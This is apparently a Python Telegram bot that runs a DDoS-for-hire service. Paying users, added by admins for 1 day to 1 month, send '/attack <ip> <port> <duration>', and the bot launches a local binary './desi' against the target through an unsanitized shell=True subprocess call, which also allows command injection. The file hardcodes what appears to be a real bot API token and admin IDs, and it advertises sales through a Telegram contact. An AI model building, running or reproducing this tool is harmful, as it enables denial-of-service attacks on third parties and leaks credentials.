import telebot
import datetime
import random
import logging
import subprocess
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize the bot with your bot's API token
bot = telebot.TeleBot('7932053303:AAFt0CiG_B_VRR4QynZ2r9SmyP6r3MiX69Q')

# Admin user IDs (replace with your own admin IDs as strings)
admin_ids = ["6768273586","2007860433"]

# File to store allowed user IDs with expiry dates
USER_FILE = "users.txt"

# Dictionary to store allowed users with expiry dates
allowed_users = {}

# Dictionary to store last attack times for each user
user_last_attack_time = {}

# Variable to manage admin add state
admin_add_state = {}

# Dictionary to store user navigation history (stack-based)
user_navigation_history = {}

# Read user IDs and expiry dates from the file
def read_users():
    users = {}
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    user_id, expiry_str = parts
                    expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    users[user_id] = expiry_date
    except FileNotFoundError:
        pass
    return users

# Write user IDs and expiry dates to the file
def write_users(users):
    with open(USER_FILE, "w") as file:
        for user_id, expiry_date in users.items():
            file.write(f"{user_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")

# Load users at startup
allowed_users = read_users()

# Function to create main reply markup with buttons
def create_main_reply_markup(user_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('🚀 Attack 🚀'),
        KeyboardButton('ℹ️ My Info'),
        KeyboardButton('📄 Show Help'),
        KeyboardButton('🔑 For Access')
    )
    if user_id in admin_ids:
        markup.add(KeyboardButton('🔒 Admin Only'))
    return markup

# Function to create admin reply markup with add/remove buttons
def create_admin_reply_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('➕ Add User'),
        KeyboardButton('➖ Remove User'),
        KeyboardButton('⬅️ Back')
    )
    return markup

# Function to create duration selection markup
def create_duration_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('1 Day'),
        KeyboardButton('7 Days'),
        KeyboardButton('1 Month'),
        KeyboardButton('⬅️ Back')
    )
    return markup

# Function to create dynamic user list for removal
def create_user_removal_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    for user_id in allowed_users:
        markup.add(KeyboardButton(user_id))
    markup.add(KeyboardButton('⬅️ Back'))
    return markup

# Helper function to update user navigation history
def update_navigation_history(user_id, markup):
    if user_id not in user_navigation_history:
        user_navigation_history[user_id] = []
    user_navigation_history[user_id].append(markup)

# Helper function to get last navigation state
def get_last_navigation(user_id):
    if user_id in user_navigation_history and user_navigation_history[user_id]:
        return user_navigation_history[user_id].pop()
    return None

# Function to log commands (stub for logging, implement as needed)
def log_command(user_id, target, port, duration):
    # Add your logging logic here
    pass

# Function to handle the /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    markup = create_main_reply_markup(user_id)
    update_navigation_history(user_id, markup)
    bot.send_message(message.chat.id, "Welcome! Choose an option:", reply_markup=markup)

# Handle "My Info" button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "No username"
    role = "Admin" if user_id in admin_ids else "User"
    
    if user_id in allowed_users:
        expiry_date = allowed_users[user_id]
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"📅 Expiry Date: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⚠️ Expiry Date: Not available\n")
    
    bot.reply_to(message, response)

# Handle attack command
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:
        try:
            parts = message.text.split()[1:]  # Ignore the command part
            if len(parts) == 3:
                target_ip, target_port, duration = parts[0], int(parts[1]), int(parts[2])

                if duration > 200:
                    bot.reply_to(message, "Error: Time interval must be less than 200.")
                    return

                # Handle cooldown for non-admin users
                current_time = datetime.datetime.now()
                if user_id in user_last_attack_time:
                    last_attack_time = user_last_attack_time[user_id]
                    time_since_last_attack = (current_time - last_attack_time).total_seconds()
                    if user_id not in admin_ids and time_since_last_attack < 10:
                        cooldown_time = int(10 - time_since_last_attack)
                        bot.reply_to(message, f"You can attack again in {cooldown_time} seconds.")
                        return

                user_last_attack_time[user_id] = current_time

                bot.reply_to(message, "Changing Your IP in every 5 Seconds")
                bot.reply_to(message, f"🚀 Attack Started Successfully! 🚀\n\n Target IP: {target_ip}, \nPort: {target_port}, \nDuration: {duration}")

                log_command(user_id, target_ip, target_port, duration)

                # Simulate the attack command (replace with actual command if needed)
                full_command = f"./desi {target_ip} {target_port} {duration}"
                subprocess.run(full_command, shell=True)

                bot.reply_to(message, f"🚀 Attack Finished. 🚀 \n\nTarget: {target_ip}\nPort: {target_port}\nTime: {duration}")
            else:
                bot.reply_to(message, "Invalid command format. Please use: /attack <host> <port> <duration>")
        except ValueError:
            bot.reply_to(message, "Invalid command format. Port and time must be integers.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Handle "Attack" button
@bot.message_handler(func=lambda message: message.text == '🚀 Attack 🚀')
def prompt_attack_command(message):
    bot.reply_to(message, "Please use the format: /attack <target_ip> <target_port> <duration>")

# Handle "Show Help" button
@bot.message_handler(func=lambda message: message.text == '📄 Show Help')
def send_help_text(message):
    help_text = '''Available commands:
- 🚀 Attack 🚀: Perform an attack.
- ℹ️ My Info: View your info.
- 🔑 For Access: Request access.
- After attack command : /attack <host> <port> <time>.
- ANY QUERY : @MrinMoYxCB
'''
    bot.send_message(message.chat.id, help_text)

# Handle "For Access" button
@bot.message_handler(func=lambda message: message.text == '🔑 For Access')
def send_access_text(message):
    access_text = 'For Access/Buying, please contact @MrinMoYxCB'
    bot.send_message(message.chat.id, access_text)

# Handle "Admin Only" button
@bot.message_handler(func=lambda message: message.text == '🔒 Admin Only')
def admin_only_menu(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_admin_reply_markup()
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "Admin Menu:", reply_markup=markup)
    else:
        bot.reply_to(message, "You are not authorized to access this menu.")

# Handle "Add User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➕ Add User')
def add_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_duration_markup()
        admin_add_state[user_id] = {'step': 'select_duration'}
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "Select the access duration for the new user:", reply_markup=markup)
    else:
        bot.reply_to(message, "You are not authorized to add users.")

# Handle duration selection for adding a user
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'select_duration')
def select_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids and message.text in ['1 Day', '7 Days', '1 Month']:
        duration = message.text
        admin_add_state[user_id] = {'step': 'enter_user_id', 'duration': duration}
        bot.send_message(message.chat.id, f"Duration '{duration}' selected. Now, please enter the user ID to add:")
    else:
        bot.reply_to(message, "Invalid duration selected or unauthorized action.")

# Handle user ID input after selecting duration
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'enter_user_id')
def add_user_after_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        new_user_id = message.text.strip()
        duration = admin_add_state[user_id]['duration']

        # Calculate expiry date based on the selected duration
        if duration == '1 Day':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=1)
        elif duration == '7 Days':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=7)
        elif duration == '1 Month':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=30)

        # Add the new user with the selected expiry date
        allowed_users[new_user_id] = expiry_date
        write_users(allowed_users)

        # Clear the admin state for this user
        del admin_add_state[user_id]

        bot.reply_to(message, f"User {new_user_id} added with access for {duration}.")
    else:
        bot.reply_to(message, "You are not authorized to add users.")

# Handle "Remove User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➖ Remove User')
def remove_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if allowed_users:
            markup = create_user_removal_markup()
            update_navigation_history(user_id, markup)
            bot.send_message(message.chat.id, "Select a user to remove:", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "No users to remove.")
    else:
        bot.reply_to(message, "You are not authorized to remove users.")

# Handle dynamic user removal
@bot.message_handler(func=lambda message: message.text in allowed_users)
def remove_user_dynamic(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        user_to_remove = message.text
        if user_to_remove in allowed_users:
            del allowed_users[user_to_remove]
            write_users(allowed_users)
            bot.reply_to(message, f"User {user_to_remove} removed successfully.")
            
            # Show updated list or go back to admin menu if empty
            if allowed_users:
                markup = create_user_removal_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "Select another user to remove:", reply_markup=markup)
            else:
                markup = create_admin_reply_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "No more users to remove. Back to Admin Menu:", reply_markup=markup)
        else:
            bot.reply_to(message, f"User {user_to_remove} not found.")
    else:
        bot.reply_to(message, "You are not authorized to remove users.")

# Handle "Back" button
@bot.message_handler(func=lambda message: message.text == '⬅️ Back')
def back_to_last_menu(message):
    user_id = str(message.chat.id)
    last_markup = get_last_navigation(user_id)
    if last_markup:
        bot.send_message(message.chat.id, "Back to previous menu:", reply_markup=last_markup)
    else:
        markup = create_main_reply_markup(user_id)
        bot.send_message(message.chat.id, "Back to main menu:", reply_markup=markup)

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
